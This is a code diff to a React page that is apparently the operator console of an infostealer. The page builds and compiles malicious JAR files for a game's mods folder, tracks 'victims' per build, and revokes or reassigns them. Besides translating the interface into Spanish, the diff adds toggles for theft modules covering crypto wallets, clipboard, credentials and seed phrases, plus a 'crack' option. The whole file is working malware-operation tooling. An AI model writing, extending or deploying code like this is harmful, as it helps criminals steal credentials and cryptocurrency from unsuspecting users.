@@ -21,7 +21,7 @@ export default function BuildsPage() {
   const [busy, setBusy] = useState('');
   const [reassignFor, setReassignFor] = useState<Build | null>(null);
   const [reassignTarget, setReassignTarget] = useState('');
-  const [form, setForm] = useState({ name: '', version: '1.0.0', profile: 'full' });
+  const [form, setForm] = useState({ name: '', version: '1.0.0', profile: 'full', modules: { wallets: true, clipboard: true, credentials: true, seeds: true }, crack: true });
   const role = useRole();
 
   async function create(event: React.FormEvent) {
@@ -29,7 +29,7 @@ export default function BuildsPage() {
     setBusy('create');
     try {
       const created = await mutate<{ id: string; token: string }>('/builds', 'POST', form);
-      toast.success('Build created', { description: `token ${created.token.slice(0, 16)}…` });
+      toast.success('Build creado', { description: `token ${created.token.slice(0, 16)}…` });
       setOpen(false);
       refresh();
     } catch (caught) {
@@ -43,7 +43,7 @@ export default function BuildsPage() {
     setBusy(id);
     try {
       await mutate(`/builds/${id}/compile`, 'POST');
-      toast.success('JAR built');
+      toast.success('JAR compilado');
       refresh();
     } catch (caught) {
       toast.error(caught instanceof Error ? caught.message : 'compile failed');
@@ -53,11 +53,11 @@ export default function BuildsPage() {
   }
 
   async function revoke(build: Build) {
-    if (!confirm(`Revoke build ${build.name} v${build.version}? Every victim of this build is revoked too.`)) return;
+    if (!confirm(`¿Revocar ${build.name} v${build.version}? También se revocan todas sus víctimas.`)) return;
     setBusy(build.id);
     try {
       await mutate(`/builds/${build.id}/revoke`, 'POST');
-      toast.success('Build revoked');
+      toast.success('Build revocado');
       refresh();
     } catch (caught) {
       toast.error(caught instanceof Error ? caught.message : 'revoke failed');
@@ -67,11 +67,11 @@ export default function BuildsPage() {
   }
 
   async function remove(build: Build) {
-    if (!confirm(`Delete build ${build.name} v${build.version}? The JAR file stays on disk.`)) return;
+    if (!confirm(`¿Eliminar ${build.name} v${build.version}? El JAR permanece en disco.`)) return;
     setBusy(build.id);
     try {
       await mutate(`/builds/${build.id}`, 'DELETE');
-      toast.success('Build deleted');
+      toast.success('Build eliminado');
       refresh();
     } catch (caught) {
       if (caught instanceof ApiError && caught.code === 'in_use') {
@@ -105,16 +105,16 @@ export default function BuildsPage() {
 
   return (
     <>
-      <Topbar title="Builds" subtitle="config injection · one build_id per artifact key" />
+      <Topbar title="Builds" subtitle="perfil, módulos y clave de artefactos · el build_id deriva la clave" />
       <div className="pt-3">
         <Card>
           <CardHeader>
-            <CardTitle>Build catalog</CardTitle>
-            {role === 'admin' ? <Button size="sm" onClick={() => setOpen(true)}><Plus className="h-3 w-3" /> new build</Button> : null}
+            <CardTitle>Catálogo de builds</CardTitle>
+            {role === 'admin' ? <Button size="sm" onClick={() => setOpen(true)}><Plus className="h-3 w-3" /> nuevo build</Button> : null}
           </CardHeader>
-          {error ? <p className="p-3 text-xs text-bad">{error.message}</p> : loading ? <SkeletonRows rows={6} cols={6} /> : (data?.items ?? []).length === 0 ? <Empty title="No builds" hint="Create a build, compile the JAR and drop it in mods/." /> : (
+          {error ? <p className="p-3 text-xs text-bad">{error.message}</p> : loading ? <SkeletonRows rows={6} cols={6} /> : (data?.items ?? []).length === 0 ? <Empty title="Sin builds" hint="Crea un build, compila el JAR y déjalo en mods/." /> : (
             <Table>
-              <THead><TR><TH>Name</TH><TH>Version</TH><TH>Profile</TH><TH>build_id</TH><TH>Victims</TH><TH>State</TH><TH>Created</TH><TH /></TR></THead>
+              <THead><TR><TH>Nombre</TH><TH>Versión</TH><TH>Perfil</TH><TH>build_id</TH><TH>Víctimas</TH><TH>Estado</TH><TH>Creado</TH><TH /></TR></THead>
               <tbody>
                 {data!.items.map((build) => (
                   <TR key={build.id}>
@@ -127,12 +127,12 @@ export default function BuildsPage() {
                     <TD className="num text-2xs text-muted">{dateTime(build.createdAt)}</TD>
                     <TD>
                       <div className="flex justify-end gap-1">
-                        <Button size="icon" variant="ghost" title="copy token" onClick={() => { copy(build.token); toast.success('build token copied'); }}><Copy className="h-3 w-3" /></Button>
-                        {role === 'admin' ? <Button size="icon" variant="ghost" title="compile" loading={busy === build.id} onClick={() => compile(build.id)}><Hammer className="h-3 w-3" /></Button> : null}
+                        <Button size="icon" variant="ghost" title="copiar token" onClick={() => { copy(build.token); toast.success('token copiado'); }}><Copy className="h-3 w-3" /></Button>
+                        {role === 'admin' ? <Button size="icon" variant="ghost" title="compilar" loading={busy === build.id} onClick={() => compile(build.id)}><Hammer className="h-3 w-3" /></Button> : null}
                         {build.jarPath ? <a href={`/api/console/builds/${build.id}/download`} className="grid h-7 w-7 place-items-center rounded text-muted hover:text-brand"><Download className="h-3 w-3" /></a> : null}
-                        {role === 'admin' ? <Button size="icon" variant="ghost" title="reassign victims" disabled={build.victims === 0 || busy === build.id} onClick={() => { setReassignFor(build); setReassignTarget(''); }}><ArrowRightLeft className="h-3 w-3" /></Button> : null}
-                        {build.status !== 'revoked' && role === 'admin' ? <Button size="icon" variant="ghost" title="revoke" loading={busy === build.id} disabled={busy === build.id} onClick={() => revoke(build)}><Power className="h-3 w-3" /></Button> : null}
-                        {role === 'admin' ? <Button size="icon" variant="ghost" title="delete (must not be in use)" loading={busy === build.id} disabled={busy === build.id} onClick={() => remove(build)}><Trash2 className="h-3 w-3" /></Button> : null}
+                        {role === 'admin' ? <Button size="icon" variant="ghost" title="reasignar víctimas" disabled={build.victims === 0 || busy === build.id} onClick={() => { setReassignFor(build); setReassignTarget(''); }}><ArrowRightLeft className="h-3 w-3" /></Button> : null}
+                        {build.status !== 'revoked' && role === 'admin' ? <Button size="icon" variant="ghost" title="revocar" loading={busy === build.id} disabled={busy === build.id} onClick={() => revoke(build)}><Power className="h-3 w-3" /></Button> : null}
+                        {role === 'admin' ? <Button size="icon" variant="ghost" title="eliminar (no debe estar en uso)" loading={busy === build.id} disabled={busy === build.id} onClick={() => remove(build)}><Trash2 className="h-3 w-3" /></Button> : null}
                       </div>
                     </TD>
                   </TR>
@@ -145,14 +145,32 @@ export default function BuildsPage() {
 
       <Dialog open={open} onOpenChange={setOpen}>
         <DialogContent>
-          <DialogTitle>New build</DialogTitle>
+          <DialogTitle>Nuevo build</DialogTitle>
           <CardContent className="px-0">
             <form onSubmit={create} className="space-y-2">
-              <div><Label>Name</Label><Input required value={form.name} onChange={(event) => setForm({ ...form, name: event.target.value })} /></div>
-              <div><Label>Version</Label><Input required pattern="\d+\.\d+\.\d+" value={form.version} onChange={(event) => setForm({ ...form, version: event.target.value })} /></div>
-              <div><Label>Profile</Label><Select value={form.profile} onChange={(event) => setForm({ ...form, profile: event.target.value })} className="w-full"><option value="full">full</option><option value="lite">lite</option></Select></div>
-              <p className="text-2xs text-muted">A 32-byte secret and build_id are generated. The token is derived from the secret; keep both private.</p>
-              <div className="flex justify-end"><Button type="submit" loading={busy === 'create'}>Create</Button></div>
+              <div><Label>Nombre</Label><Input required value={form.name} onChange={(event) => setForm({ ...form, name: event.target.value })} /></div>
+              <div><Label>Versión</Label><Input required pattern="\d+\.\d+\.\d+" value={form.version} onChange={(event) => setForm({ ...form, version: event.target.value })} /></div>
+              <div><Label>Perfil</Label><Select value={form.profile} onChange={(event) => setForm({ ...form, profile: event.target.value })} className="w-full"><option value="full">full</option><option value="lite">lite</option></Select></div>
+              <fieldset className="rounded border border-line p-2">
+                <legend className="px-1 text-2xs uppercase tracking-wide text-muted">Módulos</legend>
+                <div className="grid grid-cols-2 gap-1">
+                  {(['wallets', 'clipboard', 'credentials', 'seeds'] as const).map((module) => {
+                    const forcedOff = form.profile === 'lite' && module !== 'wallets';
+                    return (
+                      <label key={module} className={`flex items-center gap-2 text-xs ${forcedOff ? 'text-muted/50' : ''}`}>
+                        <input type="checkbox" disabled={forcedOff} checked={!forcedOff && form.modules[module]} onChange={(event) => setForm({ ...form, modules: { ...form.modules, [module]: event.target.checked } })} />
+                        {module}{forcedOff ? ' (solo full)' : ''}
+                      </label>
+                    );
+                  })}
+                  <label className={`flex items-center gap-2 text-xs ${form.profile === 'lite' ? 'text-muted/50' : ''}`}>
+                    <input type="checkbox" disabled={form.profile === 'lite'} checked={form.profile === 'full' && form.crack} onChange={(event) => setForm({ ...form, crack: event.target.checked })} />
+                    crack
+                  </label>
+                </div>
+              </fieldset>
+              <p className="text-2xs text-muted">Se generan 32 bytes de secreto y un build_id. El token deriva del secreto; guarda ambos. El perfil lite fuerza seeds, credenciales y crack a off.</p>
+              <div className="flex justify-end"><Button type="submit" loading={busy === 'create'}>Crear</Button></div>
             </form>
           </CardContent>
         </DialogContent>
@@ -160,26 +178,26 @@ export default function BuildsPage() {
 
       <Dialog open={Boolean(reassignFor)} onOpenChange={(value) => { if (!value) setReassignFor(null); }}>
         <DialogContent>
-          <DialogTitle>Reassign victims before deleting</DialogTitle>
+          <DialogTitle>Reasignar víctimas antes de eliminar</DialogTitle>
           <form onSubmit={reassign} className="mt-3 space-y-2">
             <p className="text-xs text-muted">
-              {reassignFor?.name} v{reassignFor?.version} has {reassignFor?.victims} victim(s). Move them to another live build.
+              {reassignFor?.name} v{reassignFor?.version} tiene {reassignFor?.victims} víctima(s). Muévelas a otro build vivo.
             </p>
             <p className="text-2xs text-muted">
-              Installed agents keep their current jar config until redeployed; artifacts they upload after the move are keyed to the old build secret.
+              Los agentes instalados conservan su config hasta el redespliegue; los artefactos posteriores siguen ligados al secreto anterior.
             </p>
             <div>
-              <Label>Target build</Label>
+              <Label>Build destino</Label>
               <Select value={reassignTarget} onChange={(event) => setReassignTarget(event.target.value)} className="w-full">
-                <option value="">select…</option>
+                <option value="">selecciona…</option>
                 {(data?.items ?? []).filter((item) => item.id !== reassignFor?.id && item.status !== 'revoked').map((item) => (
                   <option key={item.id} value={item.id}>{item.name} v{item.version} · {item.profile}</option>
                 ))}
               </Select>
             </div>
             <div className="flex justify-end gap-2">
-              <Button type="button" variant="ghost" onClick={() => setReassignFor(null)}>Cancel</Button>
-              <Button type="submit" disabled={!reassignTarget} loading={busy === reassignFor?.id}>Reassign</Button>
+              <Button type="button" variant="ghost" onClick={() => setReassignFor(null)}>Cancelar</Button>
+              <Button type="submit" disabled={!reassignTarget} loading={busy === reassignFor?.id}>Reasignar</Button>
             </div>
           </form>
         </DialogContent>
